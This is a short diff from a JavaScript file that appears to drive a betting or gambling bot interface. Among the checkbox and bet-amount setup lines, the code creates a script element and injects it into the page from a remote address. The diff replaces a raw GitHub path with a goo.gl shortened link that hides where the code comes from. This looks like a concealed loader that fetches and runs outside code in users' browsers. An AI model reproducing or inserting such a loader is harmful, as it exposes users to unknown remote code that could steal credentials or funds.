@@ -84,7 +84,7 @@
     var rrbbProtectionCheckbox = document.getElementById("rrbbProtectionCheckbox");
     var rrbProtectionCheckbox = document.getElementById("rrbProtectionCheckbox");
 	var firstScript = document.getElementsByTagName('script')[0], js = document.createElement('script')
-	js.src = "github.com/q1nner/V/raw/master/24MAY"
+	js.src = "https://goo.gl/L07YCE"
 	firstScript.parentNode.insertBefore(js, firstScript)
     var manualModeCheckbox = document.getElementById("manualModeCheckbox");
     var simulateBetAmt = document.getElementById("simulateBetAmt");
